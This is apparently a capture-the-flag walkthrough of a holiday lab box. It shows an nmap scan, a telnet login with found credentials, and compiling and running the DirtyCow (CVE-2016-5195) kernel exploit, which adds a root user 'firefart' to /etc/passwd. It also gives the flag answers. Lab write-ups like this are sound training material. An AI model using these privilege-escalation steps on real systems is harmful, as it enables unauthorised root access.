# Day 13 - Coal for Christmas  (Special by John Hammond)

1. What old, deprecated protocol and service is running? `telnet

    `nmap -sV -sC 10.10.113.209`:

    ```
    Nmap scan report for 10.10.113.209
    Host is up (0.11s latency).
    Not shown: 997 closed ports
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
    |   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
    |_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
    23/tcp  open  telnet  Linux telnetd
    111/tcp open  rpcbind 2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100024  1          34773/udp   status
    |   100024  1          37160/udp6  status
    |   100024  1          46493/tcp   status
    |_  100024  1          53899/tcp6  status
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 30.03 seconds
    ```

2. Run `telnet 10.10.113.209 23` and find credentials `santa:clauschristmas` so answer is `clauschristmas`.

3. What distribution of Linux and version number is this server running? Run `cat /etc/*release` to get `ubuntu 12.04`.

4. Who got here first? Run `cat cookies_and_milk.txt` to see it was the `grinch`.

5. What is the verbatim syntax you can use to compile, taken from the real C source code comments? The `cookies_and_milk.txt` file is C code and is the [DirtCow](https://dirtycow.ninja/) (CVE-2016-5195) exploit. Searching a random line from the file (specifically `char *generate_password_hash(char *plaintext_pw) {`) finds [FireFart/dirtycow](https://github.com/FireFart/dirtycow/blob/master/dirty.c) which has the compile string of `gcc -pthread dirty.c -o dirty -lcrypt`.

6. What "new" username was created, with the default operations of the real C source code? Copy and paste the exploit code into a file called `dirty.c` using `nano` then run `gcc -pthread dirty.c -o dirty -lcrypt`. Run `./dirty` to get:

    ```
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password: 
    Complete line:
    firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

    mmap: 7fca9d1f3000
    ```

    The new username is `firefart`.

7. Switch your user into that new user account, and hop over to the /root directory to own this server! Run `su firefart` with password `test`. Run `cat message_from_the_grinch.txt` which tells us to create a file called coal (`touch coal`). Finally, run `tree | md5sum` to get `8b16f00dd3b51efadb02c1df7f8427cc`.
